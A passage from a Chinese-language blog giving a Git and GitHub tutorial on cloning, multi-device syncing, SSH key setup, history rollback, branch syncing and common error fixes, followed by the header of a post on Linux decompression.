<h3 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># HTTPS 方式</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/你的GitHub用户名/仓库名.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 方式</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:你的GitHub用户名/仓库名.git</span><br></pre></td></tr></table></figure>

<h2 id="三、多设备同步工作流"><a href="#三、多设备同步工作流" class="headerlink" title="三、多设备同步工作流"></a>三、多设备同步工作流</h2><h3 id="核心逻辑"><a href="#核心逻辑" class="headerlink" title="核心逻辑"></a>核心逻辑</h3><ul>
<li>多台电脑共享同一个 GitHub 远程仓库作为”中央存储”</li>
<li>任意电脑修改后通过 <code>git push</code> 推送到 GitHub</li>
<li>其他电脑通过 <code>git pull</code> 拉取最新修改</li>
</ul>
<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="1-在新设备上拉取仓库"><a href="#1-在新设备上拉取仓库" class="headerlink" title="1. 在新设备上拉取仓库"></a>1. 在新设备上拉取仓库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:用户名/仓库.git  <span class="comment"># SSH方式</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/用户名/仓库.git  <span class="comment"># HTTPS方式</span></span><br></pre></td></tr></table></figure>

<h4 id="2-修改并推送代码"><a href="#2-修改并推送代码" class="headerlink" title="2. 修改并推送代码"></a>2. 修改并推送代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .          <span class="comment"># 添加修改</span></span><br><span class="line">git commit -m <span class="string">&quot;描述&quot;</span> <span class="comment"># 提交更改</span></span><br><span class="line">git push origin main  <span class="comment"># 推送到远程</span></span><br></pre></td></tr></table></figure>

<h4 id="3-同步最新代码"><a href="#3-同步最新代码" class="headerlink" title="3. 同步最新代码"></a>3. 同步最新代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin main  <span class="comment"># 拉取并合并远程更改</span></span><br></pre></td></tr></table></figure>

<h2 id="四、SSH-配置与问题解决"><a href="#四、SSH-配置与问题解决" class="headerlink" title="四、SSH 配置与问题解决"></a>四、SSH 配置与问题解决</h2><h3 id="核心步骤"><a href="#核心步骤" class="headerlink" title="核心步骤"></a>核心步骤</h3><p>确认密钥添加正确 → 配置 SSH 识别密钥 → 修复文件权限</p>
<h4 id="1-确认公钥添加到-GitHub"><a href="#1-确认公钥添加到-GitHub" class="headerlink" title="1. 确认公钥添加到 GitHub"></a>1. 确认公钥添加到 GitHub</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看公钥内容</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub    <span class="comment"># 默认密钥</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/自定义密钥名.pub  <span class="comment"># 自定义密钥</span></span><br></pre></td></tr></table></figure>
<ul>
<li>复制完整文本（从 <code>ssh-rsa</code> 开头到邮箱结尾）</li>
<li>GitHub → Settings → SSH and GPG keys → 添加新 Key</li>
</ul>
<h4 id="2-配置-SSH-识别密钥"><a href="#2-配置-SSH-识别密钥" class="headerlink" title="2. 配置 SSH 识别密钥"></a>2. 配置 SSH 识别密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad ~/.ssh/config</span><br></pre></td></tr></table></figure>
<p>粘贴配置（根据实际情况修改）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  HostName github.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile C:/Users/你的用户名/.ssh/密钥文件名</span><br></pre></td></tr></table></figure>
<blockquote>
<p>路径使用 <code>/</code> 或 <code>\\</code>，例如：<code>C:/Users/张三/.ssh/id_rsa</code></p>
</blockquote>
<h4 id="3-修复密钥文件权限"><a href="#3-修复密钥文件权限" class="headerlink" title="3. 修复密钥文件权限"></a>3. 修复密钥文件权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 密钥文件名      <span class="comment"># 私钥权限</span></span><br><span class="line"><span class="built_in">chmod</span> 644 密钥文件名.pub  <span class="comment"># 公钥权限</span></span><br></pre></td></tr></table></figure>

<h4 id="4-测试连接"><a href="#4-测试连接" class="headerlink" title="4. 测试连接"></a>4. 测试连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment"># 成功显示：Hi 用户名! You&#x27;ve successfully authenticated...</span></span><br></pre></td></tr></table></figure>

<h2 id="五、提交历史管理"><a href="#五、提交历史管理" class="headerlink" title="五、提交历史管理"></a>五、提交历史管理</h2><h3 id="1-撤销错误提交"><a href="#1-撤销错误提交" class="headerlink" title="1. 撤销错误提交"></a>1. 撤销错误提交</h3><h4 id="方法一：直接回退历史（个人仓库适用）"><a href="#方法一：直接回退历史（个人仓库适用）" class="headerlink" title="方法一：直接回退历史（个人仓库适用）"></a>方法一：直接回退历史（个人仓库适用）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 回退到正确提交（92d433f 为正确提交ID）</span></span><br><span class="line">git reset --hard 92d433f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 强制推送到远程</span></span><br><span class="line">git push origin main --force</span><br></pre></td></tr></table></figure>

<h4 id="方法二：创建撤销提交（多人协作适用）"><a href="#方法二：创建撤销提交（多人协作适用）" class="headerlink" title="方法二：创建撤销提交（多人协作适用）"></a>方法二：创建撤销提交（多人协作适用）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 生成撤销提交（0dec4f6 为错误提交ID）</span></span><br><span class="line">git revert 0dec4f6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 推送撤销提交</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>

<h4 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;正确的提交信息&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<h3 id="2-修复本地分支与远程分支偏离问题"><a href="#2-修复本地分支与远程分支偏离问题" class="headerlink" title="2. 修复本地分支与远程分支偏离问题"></a>2. 修复本地分支与远程分支偏离问题</h3><h4 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h4><p>本地分支历史与远程分支历史不一致（本地包含远程已移除的提交）</p>
<h4 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 保存未提交的修改（如有）</span></span><br><span class="line">git stash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 强制同步本地分支与远程分支</span></span><br><span class="line">git reset --hard origin/main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 确认同步完成</span></span><br><span class="line">git pull origin main</span><br></pre></td></tr></table></figure>

<h4 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h4><p>通过 <code>git reset --hard origin/main</code> 将本地分支完全重置为与远程分支一致的状态，覆盖本地与远程不一致的历史。</p>
<h2 id="六、高级分支同步技巧"><a href="#六、高级分支同步技巧" class="headerlink" title="六、高级分支同步技巧"></a>六、高级分支同步技巧</h2><h3 id="1-同步特定远程分支"><a href="#1-同步特定远程分支" class="headerlink" title="1. 同步特定远程分支"></a>1. 同步特定远程分支</h3><p>当需要同步特定远程分支时，可以使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先获取所有远程分支</span></span><br><span class="line">git fetch origin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建本地分支跟踪远程分支</span></span><br><span class="line">git checkout -b 本地分支名 origin/远程分支名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或直接重置当前分支到远程分支</span></span><br><span class="line">git reset --hard origin/远程分支名</span><br></pre></td></tr></table></figure>

<h3 id="2-同步多个特定分支"><a href="#2-同步多个特定分支" class="headerlink" title="2. 同步多个特定分支"></a>2. 同步多个特定分支</h3><p>Git 本身不支持一次性同步多个分支，但可以通过脚本批量操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同步多个分支</span></span><br><span class="line">git fetch origin</span><br><span class="line">git reset --hard origin/main</span><br><span class="line">git checkout dev</span><br><span class="line">git reset --hard origin/dev</span><br><span class="line">git checkout feature-branch</span><br><span class="line">git reset --hard origin/feature-branch</span><br></pre></td></tr></table></figure>

<h3 id="3-同步远程仓库的所有分支"><a href="#3-同步远程仓库的所有分支" class="headerlink" title="3. 同步远程仓库的所有分支"></a>3. 同步远程仓库的所有分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取所有远程分支</span></span><br><span class="line">git fetch --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为每个远程分支创建本地分支</span></span><br><span class="line">git branch -r | grep -v <span class="string">&#x27;\-&gt;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> remote; <span class="keyword">do</span> git branch --track <span class="string">&quot;<span class="variable">$&#123;remote#origin/&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$remote</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或删除所有本地分支后重新创建</span></span><br><span class="line">git branch | grep -v <span class="string">&quot;main&quot;</span> | xargs git branch -D</span><br><span class="line">git fetch --all</span><br><span class="line">git branch -r | grep -v <span class="string">&#x27;\-&gt;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> remote; <span class="keyword">do</span> git branch --track <span class="string">&quot;<span class="variable">$&#123;remote#origin/&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$remote</span>&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="4-重置远程分支到特定提交"><a href="#4-重置远程分支到特定提交" class="headerlink" title="4. 重置远程分支到特定提交"></a>4. 重置远程分支到特定提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要有权限</span></span><br><span class="line">git push origin --force 0dec4f6:main</span><br></pre></td></tr></table></figure>

<h3 id="5-查看分支差异"><a href="#5-查看分支差异" class="headerlink" title="5. 查看分支差异"></a>5. 查看分支差异</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看本地比远程多出的提交</span></span><br><span class="line">git <span class="built_in">log</span> origin/main..main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看远程比本地多出的提交</span></span><br><span class="line">git <span class="built_in">log</span> main..origin/main</span><br></pre></td></tr></table></figure>

<h2 id="七、其他实用技巧"><a href="#七、其他实用技巧" class="headerlink" title="七、其他实用技巧"></a>七、其他实用技巧</h2><h3 id="1-分支管理"><a href="#1-分支管理" class="headerlink" title="1. 分支管理"></a>1. 分支管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git branch -a  <span class="comment"># 查看所有分支（本地和远程）</span></span><br><span class="line">git branch -d 分支名  <span class="comment"># 安全删除（已合并）</span></span><br><span class="line">git branch -D 分支名  <span class="comment"># 强制删除（未合并）</span></span><br><span class="line">git branch -m 旧分支名 新分支名  <span class="comment"># 重命名当前分支</span></span><br><span class="line">git branch --set-upstream-to=origin/分支名 本地分支名  <span class="comment"># 重置远程跟踪分支</span></span><br></pre></td></tr></table></figure>

<h3 id="2-暂存与恢复"><a href="#2-暂存与恢复" class="headerlink" title="2. 暂存与恢复"></a>2. 暂存与恢复</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git stash  <span class="comment"># 暂存未提交修改</span></span><br><span class="line">git stash list  <span class="comment"># 查看所有暂存</span></span><br><span class="line">git stash pop  <span class="comment"># 恢复最新暂存</span></span><br><span class="line">git stash pop stash@&#123;n&#125;  <span class="comment"># 恢复指定暂存</span></span><br><span class="line">git stash drop stash@&#123;n&#125;  <span class="comment"># 删除指定暂存</span></span><br></pre></td></tr></table></figure>

<h3 id="3-撤销修改"><a href="#3-撤销修改" class="headerlink" title="3. 撤销修改"></a>3. 撤销修改</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- 文件名  <span class="comment"># 撤销工作区修改</span></span><br><span class="line">git checkout .  <span class="comment"># 撤销所有工作区修改</span></span><br></pre></td></tr></table></figure>

<h3 id="4-提交历史查看"><a href="#4-提交历史查看" class="headerlink" title="4. 提交历史查看"></a>4. 提交历史查看</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> -p  <span class="comment"># 显示每次提交的详细变化</span></span><br><span class="line">git <span class="built_in">log</span> --<span class="built_in">stat</span>  <span class="comment"># 显示每次提交的统计信息</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline --all  <span class="comment"># 图形化显示分支历史</span></span><br><span class="line">git show 提交ID  <span class="comment"># 查看某次提交的详细内容</span></span><br><span class="line">git add -p  <span class="comment"># 交互式选择要添加的修改</span></span><br></pre></td></tr></table></figure>

<h3 id="5-拉取特定文件"><a href="#5-拉取特定文件" class="headerlink" title="5. 拉取特定文件"></a>5. 拉取特定文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout origin/分支名 -- 文件路径  <span class="comment"># 从远程分支拉取特定文件</span></span><br></pre></td></tr></table></figure>

<h2 id="八、多仓库协作"><a href="#八、多仓库协作" class="headerlink" title="八、多仓库协作"></a>八、多仓库协作</h2><h3 id="1-添加多个远程仓库"><a href="#1-添加多个远程仓库" class="headerlink" title="1. 添加多个远程仓库"></a>1. 添加多个远程仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加上游仓库（原始项目）</span></span><br><span class="line">git remote add upstream https://github.com/原作者/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加自己的fork</span></span><br><span class="line">git remote add fork https://github.com/你的用户名/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有远程仓库</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<h3 id="2-从上游仓库拉取更新"><a href="#2-从上游仓库拉取更新" class="headerlink" title="2. 从上游仓库拉取更新"></a>2. 从上游仓库拉取更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取上游仓库更新</span></span><br><span class="line">git fetch upstream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并到当前分支</span></span><br><span class="line">git merge upstream/main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用rebase保持提交历史线性</span></span><br><span class="line">git rebase upstream/main</span><br></pre></td></tr></table></figure>

<h3 id="3-同步fork与上游仓库"><a href="#3-同步fork与上游仓库" class="headerlink" title="3. 同步fork与上游仓库"></a>3. 同步fork与上游仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 添加上游仓库</span></span><br><span class="line">git remote add upstream https://github.com/原作者/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 获取上游更新</span></span><br><span class="line">git fetch upstream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 合并到本地main分支</span></span><br><span class="line">git checkout main</span><br><span class="line">git merge upstream/main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 推送到自己的fork</span></span><br><span class="line">git push fork main</span><br></pre></td></tr></table></figure>

<h2 id="九、GitHub高级功能"><a href="#九、GitHub高级功能" class="headerlink" title="九、GitHub高级功能"></a>九、GitHub高级功能</h2><h3 id="1-GitHub-Copilot"><a href="#1-GitHub-Copilot" class="headerlink" title="1. GitHub Copilot"></a>1. GitHub Copilot</h3><ul>
<li>AI辅助编程，从简单模板到复杂功能</li>
<li>支持多种编程语言</li>
<li>集成在VS Code、JetBrains等IDE中</li>
</ul>
<h3 id="2-GitHub-Actions"><a href="#2-GitHub-Actions" class="headerlink" title="2. GitHub Actions"></a>2. GitHub Actions</h3><ul>
<li>自动化工作流</li>
<li>CI&#x2F;CD流水线</li>
<li>自动测试和部署</li>
<li>示例配置：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">CI</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">tests</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        npm install</span></span><br><span class="line"><span class="string">        npm test</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-GitHub-Security"><a href="#3-GitHub-Security" class="headerlink" title="3. GitHub Security"></a>3. GitHub Security</h3><ul>
<li><strong>Code Scanning</strong>：自动扫描代码漏洞</li>
<li><strong>Dependabot</strong>：自动更新依赖项</li>
<li><strong>Secret Scanning</strong>：检测泄露的密钥</li>
<li><strong>Security Alerts</strong>：安全漏洞通知</li>
</ul>
<h3 id="4-GitHub-Projects"><a href="#4-GitHub-Projects" class="headerlink" title="4. GitHub Projects"></a>4. GitHub Projects</h3><ul>
<li>项目管理工具</li>
<li>Kanban看板</li>
<li>任务跟踪</li>
<li>与Issues集成</li>
</ul>
<h3 id="5-GitHub-Codespaces"><a href="#5-GitHub-Codespaces" class="headerlink" title="5. GitHub Codespaces"></a>5. GitHub Codespaces</h3><ul>
<li>云端开发环境</li>
<li>集成VS Code</li>
<li>按需启动</li>
<li>无缝协作</li>
</ul>
<h2 id="十、最佳实践"><a href="#十、最佳实践" class="headerlink" title="十、最佳实践"></a>十、最佳实践</h2><h3 id="1-分支策略"><a href="#1-分支策略" class="headerlink" title="1. 分支策略"></a>1. 分支策略</h3><ul>
<li><strong>主分支</strong>：main&#x2F;master - 用于生产环境</li>
<li><strong>开发分支</strong>：dev - 用于集成测试</li>
<li><strong>功能分支</strong>：feature&#x2F;xxx - 用于开发新功能</li>
<li><strong>修复分支</strong>：hotfix&#x2F;xxx - 用于紧急修复</li>
</ul>
<h3 id="2-提交规范"><a href="#2-提交规范" class="headerlink" title="2. 提交规范"></a>2. 提交规范</h3><ul>
<li>提交信息应清晰描述修改内容</li>
<li>使用”feat:”, “fix:”, “docs:”, “style:”, “refactor:”, “test:”, “chore:”等前缀</li>
<li>示例：<code>feat: 添加用户登录功能</code></li>
</ul>
<h3 id="3-代码审查"><a href="#3-代码审查" class="headerlink" title="3. 代码审查"></a>3. 代码审查</h3><ul>
<li>一次审查不超过200行代码</li>
<li>专注于逻辑问题而非风格问题</li>
<li>提供具体建议而非泛泛而谈</li>
<li>使用GitHub的Review功能</li>
</ul>
<h3 id="4-定期同步"><a href="#4-定期同步" class="headerlink" title="4. 定期同步"></a>4. 定期同步</h3><ul>
<li>每天至少pull一次最新代码</li>
<li>在开始新功能前先同步远程代码</li>
</ul>
<h3 id="5-小步提交"><a href="#5-小步提交" class="headerlink" title="5. 小步提交"></a>5. 小步提交</h3><ul>
<li>每次提交只包含一个逻辑变更</li>
<li>不要将多个不相关的修改放在一个提交中</li>
</ul>
<h2 id="十一、常见问题解决方案"><a href="#十一、常见问题解决方案" class="headerlink" title="十一、常见问题解决方案"></a>十一、常见问题解决方案</h2><h3 id="1-“Permission-denied-publickey-”-错误"><a href="#1-“Permission-denied-publickey-”-错误" class="headerlink" title="1. “Permission denied (publickey)” 错误"></a>1. “Permission denied (publickey)” 错误</h3><ul>
<li>确认SSH密钥已添加到GitHub</li>
<li>检查密钥权限是否正确</li>
<li>测试SSH连接：<code>ssh -T git@github.com</code></li>
</ul>
<h3 id="2-“fatal-not-a-git-repository”-错误"><a href="#2-“fatal-not-a-git-repository”-错误" class="headerlink" title="2. “fatal: not a git repository” 错误"></a>2. “fatal: not a git repository” 错误</h3><ul>
<li>确保在Git仓库目录内操作</li>
<li>使用<code>git init</code>初始化仓库</li>
</ul>
<h3 id="3-“remote-origin-already-exists”-错误"><a href="#3-“remote-origin-already-exists”-错误" class="headerlink" title="3. “remote origin already exists” 错误"></a>3. “remote origin already exists” 错误</h3><ul>
<li>使用<code>git remote set-url origin [新地址]</code>修改地址</li>
<li>或先删除远程：<code>git remote remove origin</code></li>
</ul>
<h3 id="4-“unable-to-update-local-ref”-错误"><a href="#4-“unable-to-update-local-ref”-错误" class="headerlink" title="4. “unable to update local ref” 错误"></a>4. “unable to update local ref” 错误</h3><ul>
<li>清理本地引用：<code>git remote prune origin</code></li>
<li>重置本地分支：<code>git reset --hard origin/main</code></li>
</ul>
<h3 id="5-“detached-HEAD”-状态"><a href="#5-“detached-HEAD”-状态" class="headerlink" title="5. “detached HEAD” 状态"></a>5. “detached HEAD” 状态</h3><ul>
<li>创建新分支：<code>git checkout -b 新分支名</code></li>
<li>或回到已有分支：<code>git checkout main</code></li>
</ul>
<h3 id="6-“refusing-to-merge-unrelated-histories”-错误"><a href="#6-“refusing-to-merge-unrelated-histories”-错误" class="headerlink" title="6. “refusing to merge unrelated histories” 错误"></a>6. “refusing to merge unrelated histories” 错误</h3><ul>
<li>使用<code>git pull origin main --allow-unrelated-histories</code></li>
</ul>
<h3 id="7-“Your-branch-is-ahead-of-‘origin-main’-by-X-commits”-错误"><a href="#7-“Your-branch-is-ahead-of-‘origin-main’-by-X-commits”-错误" class="headerlink" title="7. “Your branch is ahead of ‘origin&#x2F;main’ by X commits” 错误"></a>7. “Your branch is ahead of ‘origin&#x2F;main’ by X commits” 错误</h3><ul>
<li>确认是否需要强制推送：<code>git push --force</code></li>
<li>或拉取远程更改：<code>git pull origin main</code></li>
</ul>
<h3 id="8-“Your-branch-is-behind-‘origin-main’-by-X-commits”-错误"><a href="#8-“Your-branch-is-behind-‘origin-main’-by-X-commits”-错误" class="headerlink" title="8. “Your branch is behind ‘origin&#x2F;main’ by X commits” 错误"></a>8. “Your branch is behind ‘origin&#x2F;main’ by X commits” 错误</h3><ul>
<li>拉取远程更改：<code>git pull origin main</code></li>
</ul>
<h3 id="9-“conflict”-错误"><a href="#9-“conflict”-错误" class="headerlink" title="9. “conflict” 错误"></a>9. “conflict” 错误</h3><ul>
<li>手动解决冲突文件</li>
<li>使用<code>git add</code>标记冲突已解决</li>
<li>完成合并：<code>git commit</code></li>
</ul>
<h3 id="10-“untracked-files”-问题"><a href="#10-“untracked-files”-问题" class="headerlink" title="10. “untracked files” 问题"></a>10. “untracked files” 问题</h3><ul>
<li>添加未跟踪文件：<code>git add .</code></li>
<li>或忽略文件：在.gitignore中添加文件模式</li>
</ul>
<hr>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2024/12/04/Linux%E4%B8%AD%E7%9A%84%E8%A7%A3%E5%8E%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rooie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/04/Linux%E4%B8%AD%E7%9A%84%E8%A7%A3%E5%8E%8B/" class="post-title-link" itemprop="url">Linux中的解压</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-12-04 12:00:00" itemprop="dateCreated datePublished" datetime="2024-12-04T12:00:00+08:00">2024-12-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-25 21:47:06" itemprop="dateModified" datetime="2025-11-25T21:47:06+08:00">2025-11-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/" itemprop="url" rel="index"><span itemprop="name">知识杂碎</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.4k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>5 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
